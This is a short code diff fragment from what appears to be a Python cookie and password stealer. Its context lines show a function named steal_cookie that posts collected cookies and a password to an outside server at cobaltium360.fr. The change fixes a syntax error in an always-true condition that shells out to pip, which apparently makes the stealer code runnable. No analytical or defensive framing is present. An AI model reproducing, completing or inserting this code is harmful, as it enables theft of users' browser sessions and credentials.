@@ -99,7 +99,7 @@ def steal_cookie():
     data = {"cookies": cookies, "password": password}
     r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
         
-if(1 = 1):
+if(1 == 1):
     op = subprocess.Popen("pip --version", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
     output_error = op.stderr.read()
